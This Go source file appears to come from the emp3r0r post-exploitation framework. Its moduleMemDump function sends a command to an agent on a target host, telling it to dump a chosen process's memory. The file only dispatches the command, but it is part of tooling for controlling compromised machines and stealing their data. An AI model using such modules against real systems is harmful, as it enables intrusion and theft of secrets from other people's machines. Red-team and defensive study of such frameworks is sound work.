//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func moduleMemDump() {
	pidOpt, ok := Options["pid"]
	if !ok {
		CliPrintError("Option 'pid' not found")
		return
	}
	cmd := fmt.Sprintf("%s --pid %s", emp3r0r_data.C2CmdMemDump, pidOpt.Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrint("Please wait for agent's response...")
}
